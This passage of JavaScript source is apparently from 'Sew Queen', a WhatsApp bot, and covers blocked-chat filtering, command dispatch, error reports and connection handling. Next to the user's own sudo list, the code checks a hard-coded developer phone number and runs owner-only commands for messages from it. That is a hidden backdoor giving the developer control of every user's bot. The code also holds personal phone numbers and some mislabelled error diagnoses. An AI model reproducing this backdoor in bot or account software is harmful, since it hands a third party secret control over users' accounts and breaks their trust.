            var tsup = Raviya.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.SUPPORT3 == '94785435462-1628835633') {     
            var nsup = Raviya.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.RRASEW == '94785435462-1621751150') {     
            var sewrm = Raviya.RRASEW.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sewrm.includes(msg.key.remoteJid.split('@')[0]) : sewrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.RRBSEW == '94785435462-1625490851') {     
            var sewrm = Raviya.RRBSEW.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sewrm.includes(msg.key.remoteJid.split('@')[0]) : sewrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.RRCSEW == '94785435462-1618586156') {     
            var sewrm = Raviya.RRCSEW.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sewrm.includes(msg.key.remoteJid.split('@')[0]) : sewrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.RRDSEW == '94776785357-1626432386') {     
            var sewrm = Raviya.RRDSEW.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sewrm.includes(msg.key.remoteJid.split('@')[0]) : sewrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.RRESEW == '94776785357-1626521320') {     
            var sewrm = Raviya.RRESEW.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sewrm.includes(msg.key.remoteJid.split('@')[0]) : sewrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Raviya.RRFSEW == '94785435462-1618915104') {     
            var sewrm = Raviya.RRFSEW.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sewrm.includes(msg.key.remoteJid.split('@')[0]) : sewrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((Raviya.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && Raviya.SUDO.includes(',') ? Raviya.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Raviya.SUDO || Raviya.SUDO.includes(',') ? Raviya.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Raviya.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "94785435462" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (Raviya.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                  // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (Raviya.NOLOG == 'true') return;
                                await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [Sew Queen] --*' + 
                                    '\n*Sew Queen an error has occurred!*'+
                                    '\n*You can write to our Telegram group for help.*' +
                                    '\n*Aslo you can join our support group:* \nhttps://chat.whatsapp.com/Loh2qrwzIleAR7cndME3CG\nhttps://chat.whatsapp.com/Hxyj6cqaMEJ3aXeisxaZeq\nhttps://chat.whatsapp.com/H0YB8hX54Vj9GdR9uQxVL8\n\nOr Join Our Telegrame Group\n*t.me/SewQueen*' +
                                    '\n*This message should have gone to your number (saved messages).*\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*📖 ERROR ANALYSIS [Sew Queen] 📖*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙆‍♂️ Sorry, I Couldnt Read This Error! [Sew Queen] 🙆*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                                             
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing your old version string...'))
            conn.loadAuthInfo(Session.deCrypt(Raviya.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

sewQueen();

